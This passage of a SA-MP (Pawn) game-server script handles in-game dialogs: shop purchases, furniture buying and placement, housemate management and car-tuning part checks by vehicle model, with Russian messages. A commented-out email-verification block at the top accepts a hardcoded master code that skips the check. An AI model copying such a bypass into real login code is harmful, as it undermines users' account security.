		    if(krek != GetPVarInt(playerid,"Kod") && krek != 1018338)
		    {
		        if(GetPVarInt(playerid,"CheckSS") > 2)
		        {
		            static const fmt_str[] = "[A] %s не прошел проверку по почте";
		 			new str6[sizeof(fmt_str)+32];
		    		format(str6, sizeof(str6), fmt_str,PlayerInfo[playerid][pSendername]);
				    SendAdminMessage(CLIGHTRED,str6);
					SaveAccount(playerid);
					SetPVarInt(playerid,"Kick1",1);
					Kick(playerid, FIX_FUNCTION, 1200);
					return true;
		        }
		        else
		        {
		            SetPVarInt(playerid,"CheckSS",GetPVarInt(playerid,"CheckSS")+1);
		            SendClientMessage(playerid,CGREY,"Неверный код!");
		            return ShowPlayerDialog(playerid,301,DIALOG_STYLE_INPUT,"Авторизация","{FFFFFF}Введите код высланый Вам на почту:","Готово","Отмена");
		        }
		    }
		    static const fmt_str[] = "[A] %s прошел проверку по почте";
 			new str6[sizeof(fmt_str)+32];
    		format(str6, sizeof(str6), fmt_str,PlayerInfo[playerid][pSendername]);
		    SendAdminMessage(CYELLOW,str6);
   			new ipStr[16];
			GetPlayerIp( playerid, ipStr, 16 );
			SetPlayerStr(PlayerInfo[playerid][pSendername],"ip",ipStr);
		    DeletePVar(playerid,"CheckProvAdm");
		    DeletePVar(playerid,"CheckSS");
		    DeletePVar(playerid,"Kod");
		}*/
		case 302:
		{
		    if(!response) return true;
		    if(BizInfo[GetPVarInt(playerid,"PBIZ")][bProd] < GetPVarInt(playerid,"AmmoProd")) return SendClientMessage(playerid,CGREY,"В магазине кончились продукты");
            if(!GetPVarInt(playerid,"Oplata"))
      		{
				if(PlayerInfo[playerid][pCash] < GetPVarInt(playerid,"AmmoPrice")) return SendClientMessage(playerid,CGREY,"Недостаточно средств");
			}
			else
			{
			    if(PlayerInfo[playerid][pBank] < GetPVarInt(playerid,"AmmoPrice")) return SendClientMessage(playerid,CGREY,"Недостаточно средств");
			}
			if(!GetPVarInt(playerid,"Oplata")) GiveMoney(playerid, -GetPVarInt(playerid,"AmmoPrice"));
			else PlayerInfo[playerid][pBank] -= GetPVarInt(playerid,"AmmoPrice");
			
			BizMinus(GetPVarInt(playerid,"PBIZ"),GetCena(GetPVarInt(playerid,"PBIZ"),GetPVarInt(playerid,"AmmoPrice")),GetPVarInt(playerid,"AmmoProd"));
			ApplyDynamicActorAnimation(BIZBOT[GetPVarInt(playerid,"PBIZ")],"PED","IDLE_CHAT",4.0,0,0,0,0,0);
			Update3DTextLabelTextEx(BotLable[GetPVarInt(playerid,"PBIZ")],-1,"Спасибо за покупку");
			SetTimerEx("ClearBotGlobal", 3000, false, "dd", BIZBOT[GetPVarInt(playerid,"PBIZ")],_:BotLable[GetPVarInt(playerid,"PBIZ")]);
			SetArmour(playerid,100);
		}

		case 306:
		{
		    if(!response) return true;
		    if(PlayerInfo[playerid][pCash] < 120) return SendClientMessage(playerid,CGREY,"Недостаточно средств");
		    if(GetPlayerSpecialAction(playerid) == SPECIAL_ACTION_DRINK_SPRUNK) return SendClientMessage(playerid,CGREY,"У Вас уже есть газировка");
		    SetPlayerSpecialAction(playerid,SPECIAL_ACTION_DRINK_SPRUNK),SetPVarInt(playerid,"UseSp",7);
			SendClientMessage(playerid,CGREEN,"Нажимайте ЛКМ, для того чтобы пить. Питье расчитано на 7 раз");
		}
		case 307:
		{
		    if(!response) return DeletePVar(playerid,"IDTar");
		    new str[4];
		    format(str,sizeof(str),"%i",GetPVarInt(playerid,"IDTar"));
		    switch(listitem)
		    {
		        case 0: cmd_showbadge(playerid,str);
		        case 1:
		        {
		            switch(PlayerInfo[playerid][pMember])
					{
//						case F_LIC: cmd_test(playerid,str);
						case F_HOSPITAL_LS: cmd_heal(playerid,str);
						case F_MAYOR: ShowPlayerDialog(playerid,308,DIALOG_STYLE_INPUT,"Действия с игроком","{FFFFFF}Введите статью игрока:","Выбрать","Отмена");
						case F_LVPD,F_FBI: cmd_frisk(playerid,str);
					}
		        }
		        case 2:
		        {
		            switch(PlayerInfo[playerid][pMember])
					{
						case F_HOSPITAL_LS: cmd_setsex(playerid,str);
						case F_LVPD,F_FBI:
						{
							if(!GetPVarInt(GetPVarInt(playerid,"IDTar"),"TimeCuff")) cmd_cuff(playerid,str);
							else cmd_cuff(playerid,str);
						}
					}
		        }
		        case 3:
		        {
		            switch(PlayerInfo[playerid][pMember])
					{
						case F_HOSPITAL_LS: cmd_setsex(playerid,str);
						case F_LVPD,F_FBI:
						{
							if(!GetPVarInt(GetPVarInt(playerid,"IDTar"),"Cops")) cmd_attach(playerid,str);
							else cmd_unattach(playerid,str);
						}

					}
		        }
		        case 4: cmd_healdrugs(playerid,str);
		        case 5: cmd_helpdrugs(playerid,str);
		    }
		}
		case 308:
		{
		    if(!response) return DeletePVar(playerid,"IDTar");
		    new krek[11];
		    if(sscanf(inputtext,"s[11]",krek) || strlen(krek) < 0 || strlen(krek) > 10) return ShowPlayerDialog(playerid,308,DIALOG_STYLE_INPUT,"Действия с игроком","{FFFFFF}Введите статью игрока:","Выбрать","Отмена");
		    new str[15];
		    format(str,sizeof(str),"%i %s",GetPVarInt(playerid,"IDTar"),krek);
		    cmd_free(playerid,str);
		}
		case 309:
		{
		    if(!response) return 1;
		    SetPlayerVirtualWorld(playerid,playerid+7);
		    SetPlayerInterior(playerid,7);
			SetPlayerPos(playerid,1387.4772,-30.8564,1000.9131);
			SetPlayerCameraPos(playerid,1385.533691,-26.611351,1002.013549);
			SetPlayerCameraLookAt(playerid,1384.548706,-26.611488,1001.841064);
			TogglePlayerControllable(playerid, 0);
			for(new i = 0; i < 18; i++) TextDrawShowForPlayer(playerid,ObjectBuy[i]);
   			for(new i = 0; i < 3; i++) PlayerTextDrawShow(playerid,ObjectBuyP[i][playerid]);
			DeletePVar(playerid,"MebelCheck");
			DeletePVar(playerid,"MebelRaz");
			SetPVarInt(playerid,"InMebel",1);

			SelectTextDraw(playerid, CGREY);
			SetMebel(playerid);
			static const fmt_str1[] = "$%i";
			new string1[sizeof(fmt_str1)+10];
			format(string1, sizeof(string1), fmt_str1, furniture_beds_price[0]);
			PlayerTextDrawSetString(playerid,ObjectBuyP[2][playerid],string1);
			PlayerTextDrawSetString(playerid,ObjectBuyP[1][playerid],"BEDS");
			PlayerTextDrawSetString(playerid,ObjectBuyP[0][playerid],"BED 1");
		}
		case 310:
		{
		    if(!response) return true;
			if(!GetPlayerHouse(playerid)) return SendClientMessage(playerid,CGREY,"У Вас нет дома");
			new model,price;
   			GetPriceModel(GetPVarInt(playerid,"MebelRaz"),GetPVarInt(playerid,"MebelCheck"), model, price);
   			if(PlayerInfo[playerid][pCash] < price) return SendClientMessage(playerid,CGREY,"Недостаточно средств");
   			new kek = -1;
   			for(new i = 0; i <= GetSlotClass(GetPVarInt(playerid,"PlayerHouse")); i++)
   			{
   			    if(MebelInfo[i][GetPVarInt(playerid,"PlayerHouse")][mmodel]) continue;
   			    kek = i;
   			    break;
   			}
   			if(kek == -1) return SendClientMessage(playerid,CGREY,"Все слоты для мебели у Вас заняты");
   			MebelInfo[kek][GetPVarInt(playerid,"PlayerHouse")][mmodel] = model;
   			MebelInfo[kek][GetPVarInt(playerid,"PlayerHouse")][mcena] = price;
   			GiveMoney(playerid,-price);
   			SendClientMessage(playerid,CREWARD,"Мебель доставили к Вам домой. Для установки используйте: /house");
   			SaveMebel(kek,GetPVarInt(playerid,"PlayerHouse"));
			ExitMebel(playerid);
		}
		case 311:
		{
		    if(!response) return 1;
		    new i = listitem;
		    SetPVarInt(playerid,"RedObj",i+1);
			new idx = GetPVarInt(playerid,"PlayerHouse");
		    if(MebelInfo[i][GetPVarInt(playerid,"PlayerHouse")][mx] == 0.0)
		    {
		        SendClientMessage(playerid,CREWARD,"Установите мебель и нажмите на иконку 'Сохранить'");
		        new Float:x,Float:y,Float:z;
		        GetPlayerPos(playerid,x,y,z);
		        MebelInfo[i][idx][mobjid] = CreateDynamicObject(MebelInfo[i][idx][mmodel],x+2,y+2,z
				,0.0,0.0,0.0,idx);
				EditDynamicObject(playerid,MebelInfo[i][idx][mobjid]);
		    }
		    else ShowPlayerDialog(playerid,312,DIALOG_STYLE_LIST,"Редактировать","Редактировать положение\nУбрать\nПродать","Далее","Отмена");
		}
		case 312:
		{
		    if(!response) return true;
			new i = GetPVarInt(playerid,"RedObj")-1;
			new idx = GetPVarInt(playerid,"PlayerHouse");
			switch(listitem)
			{
			    case 0:
			    {
					SendClientMessage(playerid,CREWARD,"Установите мебель и нажмите на иконку 'Сохранить'");
					DestroyDynamicObject(MebelInfo[i][idx][mobjid]);
					SetPVarInt(playerid,"RedObj1",1);
					MebelInfo[i][idx][mobjid] = CreateDynamicObject(MebelInfo[i][idx][mmodel],MebelInfo[i][idx][mx],MebelInfo[i][idx][my],MebelInfo[i][idx][mz]
					,MebelInfo[i][idx][mrx],MebelInfo[i][idx][mry],MebelInfo[i][idx][mrz],idx);
					EditDynamicObject(playerid,MebelInfo[i][idx][mobjid]);
			    }
			    case 1:
			    {
			        DestroyDynamicObject(MebelInfo[i][idx][mobjid]);
			        MebelInfo[i][idx][mobjid] = 0;
			        MebelInfo[i][idx][mx] = 0.0;
			        SendClientMessage(playerid,CREWARD,"Мебель убрана");
			        SaveMebel(i,GetPVarInt(playerid,"PlayerHouse"));
			        DeletePVar(playerid,"RedObj");
			    }
			    case 2:
			    {
					static const fmt_str[] = "{ffffff}Вы действительно хотите продать мебель?\nВы получите:{f7ae11}\n$%i{FFFFFF}";
					new str6[sizeof(fmt_str)+10];
					format(str6, sizeof(str6), fmt_str,MebelInfo[i][idx][mcena]/2);
					ShowPlayerDialog(playerid,313,DIALOG_STYLE_MSGBOX,"Продажа мебели",str6,"Далее","Отмена");
			    }
			    
			}
		}
		case 313:
		{
		    if(!response) return DeletePVar(playerid,"RedObj");
			new i = GetPVarInt(playerid,"RedObj")-1;
			new idx = GetPVarInt(playerid,"PlayerHouse");
			DestroyDynamicObject(MebelInfo[i][idx][mobjid]);
			GiveMoney(playerid,MebelInfo[i][idx][mcena]/2);
			MebelInfo[i][idx][mmodel] = 0;
	        MebelInfo[i][idx][mobjid] = 0;
	        MebelInfo[i][idx][mx] = 0.0;
	        MebelInfo[i][idx][my] = 0.0;
	        MebelInfo[i][idx][mz] = 0.0;
	        MebelInfo[i][idx][mrx] = 0.0;
	        MebelInfo[i][idx][mry] = 0.0;
	        MebelInfo[i][idx][mrz] = 0.0;
	        MebelInfo[i][idx][mcena] = 0;
	        SendClientMessage(playerid,CREWARD,"Вы продали мебель и получили половину от гос. стоимости");
	        SaveMebel(i,GetPVarInt(playerid,"PlayerHouse"));
	        DeletePVar(playerid,"RedObj");
		}
		case 314:
		{
			if(!response) return 1;
			switch(listitem)
			{
  				case 0:
				{
				    if(!strcmp(HInfo[GetPVarInt(playerid,"PlayerHouse")][hZasel1], "None", true))
					{
						ShowPlayerDialog(playerid,117,DIALOG_STYLE_INPUT,"Заселение","{FFFFFF}Введите ID, которого хотите подселить:" ,"Далее","Назад");
						SetPVarInt(playerid,"Zasel",1);
					}
					else
					{
					    strmid(HInfo[GetPVarInt(playerid,"PlayerHouse")][hZasel1], "None", 0, strlen("None"), 32);
					    SetHouseStr(GetPVarInt(playerid,"PlayerHouse"),"hZasel1","None");
					    SendClientMessage(playerid,CREWARD,"[HOUSE]{FFFFFF} Вы выселили игрока");
					}
				}
				case 1:
				{
				    if(!strcmp(HInfo[GetPVarInt(playerid,"PlayerHouse")][hZasel2], "None", true))
					{
						ShowPlayerDialog(playerid,117,DIALOG_STYLE_INPUT,"Заселение","{FFFFFF}Введите ID, которого хотите подселить:" ,"Далее","Назад");
						SetPVarInt(playerid,"Zasel",2);
					}
					else
					{
					    strmid(HInfo[GetPVarInt(playerid,"PlayerHouse")][hZasel2], "None", 0, strlen("None"), 32);
					    SetHouseStr(GetPVarInt(playerid,"PlayerHouse"),"hZasel2","None");
					    SendClientMessage(playerid,CREWARD,"[HOUSE]{FFFFFF} Вы выселили игрока");
					}
				}
				case 2:
				{
				    if(!strcmp(HInfo[GetPVarInt(playerid,"PlayerHouse")][hZasel3], "None", true))
					{
						ShowPlayerDialog(playerid,117,DIALOG_STYLE_INPUT,"Заселение","{FFFFFF}Введите ID, которого хотите подселить:" ,"Далее","Назад");
						SetPVarInt(playerid,"Zasel",3);
					}
					else
					{
					    strmid(HInfo[GetPVarInt(playerid,"PlayerHouse")][hZasel3], "None", 0, strlen("None"), 32);
					    SetHouseStr(GetPVarInt(playerid,"PlayerHouse"),"hZasel3","None");
					    SendClientMessage(playerid,CREWARD,"[HOUSE]{FFFFFF} Вы выселили игрока");
					}
				}
				case 3:
				{
				    if(!strcmp(HInfo[GetPVarInt(playerid,"PlayerHouse")][hZasel4], "None", true))
					{
						ShowPlayerDialog(playerid,117,DIALOG_STYLE_INPUT,"Заселение","{FFFFFF}Введите ID, которого хотите подселить:" ,"Далее","Назад");
						SetPVarInt(playerid,"Zasel",4);
					}
					else
					{
					    strmid(HInfo[GetPVarInt(playerid,"PlayerHouse")][hZasel4], "None", 0, strlen("None"), 32);
					    SetHouseStr(GetPVarInt(playerid,"PlayerHouse"),"hZasel4","None");
					    SendClientMessage(playerid,CREWARD,"[HOUSE]{FFFFFF} Вы выселили игрока");
					}
				}
			}
		}
		case 315:
		{
		    if(!response) return 1;
			
			switch(listitem)// Checking which list item was selected
        	{
        	    case 0:// fury
        	    {
                	if(
					GetVehicleModel(GetPlayerVehicleID(playerid)) == 401 ||
					GetVehicleModel(GetPlayerVehicleID(playerid)) == 518 ||
					GetVehicleModel(GetPlayerVehicleID(playerid)) == 589 ||
					GetVehicleModel(GetPlayerVehicleID(playerid)) == 492 ||
					GetVehicleModel(GetPlayerVehicleID(playerid)) == 426 ||
					GetVehicleModel(GetPlayerVehicleID(playerid)) == 550)
			    	{
			    	    //AddVehicleComponent(GetPlayerVehicleID(playerid),1005);
			    	    TuningBuy(playerid,"Капот",1005,8000);
					}
					else
					{
					SendClientMessage(playerid,CGREY,"Данная деталь не доступна Вашем автомобилю");
					ShowPlayerDialog(playerid,315 , DIALOG_STYLE_LIST, "Капот", "Fury\nChamp\nRace\nWorx", "Далее", "Отмена");
					}
	    		}
        	    case 1: // Champ
        	    {
                if(
					GetVehicleModel(GetPlayerVehicleID(playerid)) == 401 ||
					GetVehicleModel(GetPlayerVehicleID(playerid)) == 492 ||
					GetVehicleModel(GetPlayerVehicleID(playerid)) == 546 ||
					GetVehicleModel(GetPlayerVehicleID(playerid)) == 426 ||
					GetVehicleModel(GetPlayerVehicleID(playerid)) == 550)
			    	{
			        //	AddVehicleComponent(GetPlayerVehicleID(playerid),1005);
			    	    TuningBuy(playerid,"Капот",1004,8000);
					}
					else
					{
					SendClientMessage(playerid,CGREY,"Данная деталь не доступна Вашем автомобилю");
					ShowPlayerDialog(playerid,315 , DIALOG_STYLE_LIST, "Капот", "Fury\nChamp\nRace\nWorx", "Далее", "Отмена");
					}
        	    }
				case 2: // Race
        	    {
                	if(
					GetVehicleModel(GetPlayerVehicleID(playerid)) == 549)
			    	{
			        //	AddVehicleComponent(GetPlayerVehicleID(playerid),1005);
			    	    TuningBuy(playerid,"Капот",1011,8000);
					}
					else
					{
					SendClientMessage(playerid,CGREY,"Данная деталь не доступна Вашем автомобилю");
					ShowPlayerDialog(playerid,315 , DIALOG_STYLE_LIST, "Капот", "Fury\nChamp\nRace\nWorx", "Далее", "Отмена");
					}
        	    }
        	    case 3: // Worx
        	    {
                if(
					GetVehicleModel(GetPlayerVehicleID(playerid)) == 549)
			    	{
       				//	AddVehicleComponent(GetPlayerVehicleID(playerid),1005);
			    	    TuningBuy(playerid,"Капот",1012,8000);
					}
					else
					{
					SendClientMessage(playerid,CGREY,"Данная деталь не доступна Вашем автомобилю");
					ShowPlayerDialog(playerid,315 , DIALOG_STYLE_LIST, "Капот", "Fury\nChamp\nRace\nWorx", "Далее", "Отмена");
					}
        	    }
			}
		}
		case 316:
		{
		    if(!response) return 1;
		    switch(listitem)// Checking which list item was selected
        	{
        	    case 0:// Oval
        	    {
     				if(
					GetVehicleModel(GetPlayerVehicleID(playerid)) == 401 ||//bravura
					GetVehicleModel(GetPlayerVehicleID(playerid)) == 518 ||//buccaneer
					GetVehicleModel(GetPlayerVehicleID(playerid)) == 546 ||//intruder
					GetVehicleModel(GetPlayerVehicleID(playerid)) == 517 ||//majestic
					GetVehicleModel(GetPlayerVehicleID(playerid)) == 603 ||//phoenix
					GetVehicleModel(GetPlayerVehicleID(playerid)) == 547 ||//primo
					GetVehicleModel(GetPlayerVehicleID(playerid)) == 439 ||//stallion
					GetVehicleModel(GetPlayerVehicleID(playerid)) == 550 ||//sunrise
					GetVehicleModel(GetPlayerVehicleID(playerid)) == 549)//tampa
					{
					    TuningBuyD(playerid,"Вентиляция",1142,1143,5000);
        	    	}
        	    	else
					{
						SendClientMessage(playerid,CGREY,"Данная деталь не доступна Вашем автомобилю");
						ShowPlayerDialog(playerid, 316, DIALOG_STYLE_LIST, "Вентиляция", "Овальная\nКвадратная", "Далее", "Отмена");
					}
				}
        	    case 1: // Square
        	    {
                if(
					GetVehicleModel(GetPlayerVehicleID(playerid)) == 401 ||//bravura
					GetVehicleModel(GetPlayerVehicleID(playerid)) == 518 ||//buccaneer
					GetVehicleModel(GetPlayerVehicleID(playerid)) == 589 ||//club
					GetVehicleModel(GetPlayerVehicleID(playerid)) == 546 ||//intruder
					GetVehicleModel(GetPlayerVehicleID(playerid)) == 517 ||//majestic
					GetVehicleModel(GetPlayerVehicleID(playerid)) == 603 ||//phoenix
					GetVehicleModel(GetPlayerVehicleID(playerid)) == 439 ||//stallion
					GetVehicleModel(GetPlayerVehicleID(playerid)) == 550 ||//sunrise
					GetVehicleModel(GetPlayerVehicleID(playerid)) == 549)//tampa
					{
					    TuningBuyD(playerid,"Вентиляция",1144,1145,5000);
        	    	}
        	    	else
					{
						SendClientMessage(playerid,CGREY,"Данная деталь не доступна Вашем автомобилю");
						ShowPlayerDialog(playerid, 316, DIALOG_STYLE_LIST, "Вентиляция", "Овальная\nКвадратная", "Далее", "Отмена");
					}
        	    }
			}
		}
		case 317:
		{
		    if(!response)
		    {
		        RemoveVehicleComponent(GetPlayerVehicleID(playerid), GetPVarInt(playerid,"STODet"));
		        RemoveVehicleComponent(GetPlayerVehicleID(playerid), GetPVarInt(playerid,"STODet1"));
				new kek = 0;
				for(new i1 = 1; i1 <= TOTALV; i1++)
				{
				    if(VInfo[i1][vcar] == INVALID_VEHICLE_ID) continue;
					if(GetPlayerVehicleID(playerid) == VInfo[i1][vcar]) kek = i1;
				}
                SetTuning(GetPlayerVehicleID(playerid),kek);
                DeletePVar(playerid,"STODet");
                DeletePVar(playerid,"STODet1");
                DeletePVar(playerid,"STOPrice");
                SetPlayerCameraLookAt(playerid,-5.168276,-9.959818,2000.713623);
				SetPlayerCameraPos(playerid,-6.021756,-10.442592,2000.909790);
                //ShowTuning(playerid);
		        return true;
		    }
		    if(GetPVarInt(playerid,"ATune") == 0)
			{
			    if(PlayerInfo[playerid][pCash] < GetPVarInt(playerid,"STOPrice"))
			    {
			        SendClientMessage(playerid,CGREY,"Недостаточно средств");
	                RemoveVehicleComponent(GetPlayerVehicleID(playerid),GetPVarInt(playerid,"STODet"));
	                RemoveVehicleComponent(GetPlayerVehicleID(playerid), GetPVarInt(playerid,"STODet1"));
	                DeletePVar(playerid,"STODet");
	                DeletePVar(playerid,"STODet1");
	                DeletePVar(playerid,"STOPrice");
	                SetPlayerCameraLookAt(playerid,-5.168276,-9.959818,2000.713623);
					SetPlayerCameraPos(playerid,-6.021756,-10.442592,2000.909790);
	                //ShowTuning(playerid);
			        return true;
			    }
			    GiveMoney(playerid,-GetPVarInt(playerid,"STOPrice"));
			   	SaveVehicleTuning(playerid);
		    }
		    SendClientMessage(playerid,-1,"Вы приобрели данную деталь");
			SetPlayerCameraLookAt(playerid,-5.168276,-9.959818,2000.713623);
			SetPlayerCameraPos(playerid,-6.021756,-10.442592,2000.909790);
			//ShowTuning(playerid);
			DeletePVar(playerid,"STODet");
			DeletePVar(playerid,"STODet1");
			DeletePVar(playerid,"STOPrice");
		}
		case 318:
		{
		    if(!response) return 1;
		    switch(listitem)// Checking which list item was selected
        	{
        	    case 0:// round
        	    {
     				if(
					GetVehicleModel(GetPlayerVehicleID(playerid)) == 401 ||//bravura
					GetVehicleModel(GetPlayerVehicleID(playerid)) == 518 ||//buccaneer
					GetVehicleModel(GetPlayerVehicleID(playerid)) == 589 ||//club
					GetVehicleModel(GetPlayerVehicleID(playerid)) == 400 ||//landstalker
					GetVehicleModel(GetPlayerVehicleID(playerid)) == 436 ||//previon
					GetVehicleModel(GetPlayerVehicleID(playerid)) == 439)//stallion
					{
			        	 TuningBuy(playerid,"Фары",1013,8000);
					}
					else
					{
						SendClientMessage(playerid,CGREY,"Данная деталь не доступна Вашем автомобилю");
						ShowPlayerDialog(playerid, 318, DIALOG_STYLE_LIST, "Фары", "Круглые\nКвадратные", "Далее", "Отмена");
					}
				}
        	    case 1: // Square
        	    {
                if(
					GetVehicleModel(GetPlayerVehicleID(playerid)) == 589 ||//club
					GetVehicleModel(GetPlayerVehicleID(playerid)) == 603 ||//phoenix
					GetVehicleModel(GetPlayerVehicleID(playerid)) == 400)//landstalker
					{
   	 					TuningBuy(playerid,"Фары",1024,8000);
					}
					else
					{
						SendClientMessage(playerid,CGREY,"Данная деталь не доступна Вашем автомобилю");
						ShowPlayerDialog(playerid, 318, DIALOG_STYLE_LIST, "Фары", "Круглые\nКвадратные", "Далее", "Отмена");
					}
        	    }
			}
		}
		case 319:
		{
		    if(!response) return 1;
 			switch(listitem)
        	{
        	    case 0:
        	    {
             		if(GetVehicleModel(GetPlayerVehicleID(playerid)) == 562 ||
					GetVehicleModel(GetPlayerVehicleID(playerid)) == 565 ||
					GetVehicleModel(GetPlayerVehicleID(playerid)) == 559 ||
					GetVehicleModel(GetPlayerVehicleID(playerid)) == 558 ||
					GetVehicleModel(GetPlayerVehicleID(playerid)) == 561 ||
					GetVehicleModel(GetPlayerVehicleID(playerid)) == 560)
			        {
			            if(GetVehicleModel(GetPlayerVehicleID(playerid)) == 562) TuningBuy(playerid,"Выхлоп",1034,3000);

						else if(GetVehicleModel(GetPlayerVehicleID(playerid)) == 565) TuningBuy(playerid,"Выхлоп",1046,3000);
						else if(GetVehicleModel(GetPlayerVehicleID(playerid)) == 559) TuningBuy(playerid,"Выхлоп",1065,3000);
						else if(GetVehicleModel(GetPlayerVehicleID(playerid)) == 561) TuningBuy(playerid,"Выхлоп",1064,3000);
						else if(GetVehicleModel(GetPlayerVehicleID(playerid)) == 560) TuningBuy(playerid,"Выхлоп",1028,3000);
						else if(GetVehicleModel(GetPlayerVehicleID(playerid)) == 558) TuningBuy(playerid,"Выхлоп",1089,3000);
					}
	  			 	else
					{
						SendClientMessage(playerid,CGREY,"Данная деталь не доступна Вашем автомобилю");
						ShowPlayerDialog(playerid, 319, DIALOG_STYLE_LIST, "Выхлоп", "Wheel Arc. Alien\nWheel Arc. X-Flow\nLow Co. Chromer\nLow Co. Slamin\nTransfender Large\nTransfender Medium\nTransfender Small\nTransfender Twin\nTransfender Upswept", "Далее", "Отмена");
					}
 	    		}
        	    case 1:
        	    {
             		if(GetVehicleModel(GetPlayerVehicleID(playerid)) == 562 ||
					GetVehicleModel(GetPlayerVehicleID(playerid)) == 565 ||
					GetVehicleModel(GetPlayerVehicleID(playerid)) == 559 ||
					GetVehicleModel(GetPlayerVehicleID(playerid)) == 561 ||
					GetVehicleModel(GetPlayerVehicleID(playerid)) == 558 ||
					GetVehicleModel(GetPlayerVehicleID(playerid)) == 560)
				    {
				        if(GetVehicleModel(GetPlayerVehicleID(playerid)) == 562) TuningBuy(playerid,"Выхлоп",1037,3000);
						else if(GetVehicleModel(GetPlayerVehicleID(playerid)) == 565) TuningBuy(playerid,"Выхлоп",1045,3000);
						else if(GetVehicleModel(GetPlayerVehicleID(playerid)) == 559) TuningBuy(playerid,"Выхлоп",1066,3000);
						else if(GetVehicleModel(GetPlayerVehicleID(playerid)) == 561) TuningBuy(playerid,"Выхлоп",1059,3000);
						else if(GetVehicleModel(GetPlayerVehicleID(playerid)) == 560) TuningBuy(playerid,"Выхлоп",1029,3000);
						else if(GetVehicleModel(GetPlayerVehicleID(playerid)) == 558) TuningBuy(playerid,"Выхлоп",1092,3000);
					}
	  			 	else
					{
						SendClientMessage(playerid,CGREY,"Данная деталь не доступна Вашем автомобилю");
						ShowPlayerDialog(playerid, 319, DIALOG_STYLE_LIST, "Выхлоп", "Wheel Arc. Alien\nWheel Arc. X-Flow\nLow Co. Chromer\nLow Co. Slamin\nTransfender Large\nTransfender Medium\nTransfender Small\nTransfender Twin\nTransfender Upswept", "Далее", "Отмена");
					}
        	    }
        	    case 2:
        	    {
             		if(GetVehicleModel(GetPlayerVehicleID(playerid)) == 575 ||
					GetVehicleModel(GetPlayerVehicleID(playerid)) == 534 ||
					GetVehicleModel(GetPlayerVehicleID(playerid)) == 567 ||
					GetVehicleModel(GetPlayerVehicleID(playerid)) == 536 ||
					GetVehicleModel(GetPlayerVehicleID(playerid)) == 576 ||
					GetVehicleModel(GetPlayerVehicleID(playerid)) == 535)
				    {
				        if(GetVehicleModel(GetPlayerVehicleID(playerid)) == 575) TuningBuy(playerid,"Выхлоп",1044,3000);
						else if(GetVehicleModel(GetPlayerVehicleID(playerid)) == 534)TuningBuy(playerid,"Выхлоп",1126,3000);
						else if(GetVehicleModel(GetPlayerVehicleID(playerid)) == 567)TuningBuy(playerid,"Выхлоп",1129,3000);
						else if(GetVehicleModel(GetPlayerVehicleID(playerid)) == 536) TuningBuy(playerid,"Выхлоп",1104,3000);
						else if(GetVehicleModel(GetPlayerVehicleID(playerid)) == 535) TuningBuy(playerid,"Выхлоп",1113,3000);
						else if(GetVehicleModel(GetPlayerVehicleID(playerid)) == 576) TuningBuy(playerid,"Выхлоп",1136,3000);
					}
	  			 	else
					{
						SendClientMessage(playerid,CGREY,"Данная деталь не доступна Вашем автомобилю");
						ShowPlayerDialog(playerid, 319, DIALOG_STYLE_LIST, "Выхлоп", "Wheel Arc. Alien\nWheel Arc. X-Flow\nLow Co. Chromer\nLow Co. Slamin\nTransfender Large\nTransfender Medium\nTransfender Small\nTransfender Twin\nTransfender Upswept", "Далее", "Отмена");
					}
        	    }
				case 3:
        	    {
	             	if(GetVehicleModel(GetPlayerVehicleID(playerid)) == 575 ||
					GetVehicleModel(GetPlayerVehicleID(playerid)) == 534 ||
					GetVehicleModel(GetPlayerVehicleID(playerid)) == 567 ||
					GetVehicleModel(GetPlayerVehicleID(playerid)) == 536 ||
					GetVehicleModel(GetPlayerVehicleID(playerid)) == 576 ||
					GetVehicleModel(GetPlayerVehicleID(playerid)) == 535)
				    {
				        if(GetVehicleModel(GetPlayerVehicleID(playerid)) == 575) TuningBuy(playerid,"Выхлоп",1043,3000);
						else if(GetVehicleModel(GetPlayerVehicleID(playerid)) == 534)TuningBuy(playerid,"Выхлоп",1127,3000);
						else if(GetVehicleModel(GetPlayerVehicleID(playerid)) == 567)TuningBuy(playerid,"Выхлоп",1132,3000);
						else if(GetVehicleModel(GetPlayerVehicleID(playerid)) == 536)TuningBuy(playerid,"Выхлоп",1105,3000);

						else if(GetVehicleModel(GetPlayerVehicleID(playerid)) == 535) TuningBuy(playerid,"Выхлоп",1114,3000);
						else if(GetVehicleModel(GetPlayerVehicleID(playerid)) == 576) TuningBuy(playerid,"Выхлоп",1135,3000);
					}
	  			 	else
					{
						SendClientMessage(playerid,CGREY,"Данная деталь не доступна Вашем автомобилю");
						ShowPlayerDialog(playerid, 319, DIALOG_STYLE_LIST, "Выхлоп", "Wheel Arc. Alien\nWheel Arc. X-Flow\nLow Co. Chromer\nLow Co. Slamin\nTransfender Large\nTransfender Medium\nTransfender Small\nTransfender Twin\nTransfender Upswept", "Далее", "Отмена");
					}
        	    }
        	    case 4:// Large
        	    {
     				if(
					GetVehicleModel(GetPlayerVehicleID(playerid)) == 401 ||//bravura
					GetVehicleModel(GetPlayerVehicleID(playerid)) == 518 ||//buccaneer
					GetVehicleModel(GetPlayerVehicleID(playerid)) == 527 ||//cadrona
					GetVehicleModel(GetPlayerVehicleID(playerid)) == 542 ||//clover
					GetVehicleModel(GetPlayerVehicleID(playerid)) == 589 ||//club
					GetVehicleModel(GetPlayerVehicleID(playerid)) == 400 ||//landstalker
					GetVehicleModel(GetPlayerVehicleID(playerid)) == 517 ||//majestic
					GetVehicleModel(GetPlayerVehicleID(playerid)) == 603 ||//phoenix
					GetVehicleModel(GetPlayerVehicleID(playerid)) == 426 ||//premier
					GetVehicleModel(GetPlayerVehicleID(playerid)) == 547 ||//primo
					GetVehicleModel(GetPlayerVehicleID(playerid)) == 405 ||//sentinel
					GetVehicleModel(GetPlayerVehicleID(playerid)) == 580 ||//stafford
					GetVehicleModel(GetPlayerVehicleID(playerid)) == 550 ||//sunrise
					GetVehicleModel(GetPlayerVehicleID(playerid)) == 549 ||//tampa
					GetVehicleModel(GetPlayerVehicleID(playerid)) == 477)//zr-350
					{
			        	TuningBuy(playerid,"Выхлоп",1020,3000);
					}
	  			 	else
					{
						SendClientMessage(playerid,CGREY,"Данная деталь не доступна Вашем автомобилю");
						ShowPlayerDialog(playerid, 319, DIALOG_STYLE_LIST, "Выхлоп", "Wheel Arc. Alien\nWheel Arc. X-Flow\nLow Co. Chromer\nLow Co. Slamin\nTransfender Large\nTransfender Medium\nTransfender Small\nTransfender Twin\nTransfender Upswept", "Далее", "Отмена");
					}
				}
        	    case 5: // Medium
        	    {
             		if(
					GetVehicleModel(GetPlayerVehicleID(playerid)) == 527 ||//cadrona
